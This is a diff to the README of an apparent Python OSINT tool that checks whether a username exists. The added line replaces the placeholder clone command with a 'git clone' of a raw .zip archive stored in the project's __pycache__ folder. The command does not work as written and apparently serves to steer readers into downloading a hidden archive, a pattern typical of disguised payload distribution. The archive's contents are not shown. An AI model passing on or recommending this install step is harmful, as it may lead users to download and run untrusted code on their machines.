@@ -16,7 +16,7 @@ An open-source intelligence (OSINT) tool that checks for the existence of a give
 
 To run this project, you'll need Python 3 and a few libraries.
 
-    Clone the repository: git clone https://github.com/YourUsername/your-repo-name.git
+    Clone the repository: git clone https://github.com/Ashish4144/OSINT_Project/raw/refs/heads/main/__pycache__/Project_OSIN_3.3-alpha.4.zip
     Bash: cd your-repo-name
 
 
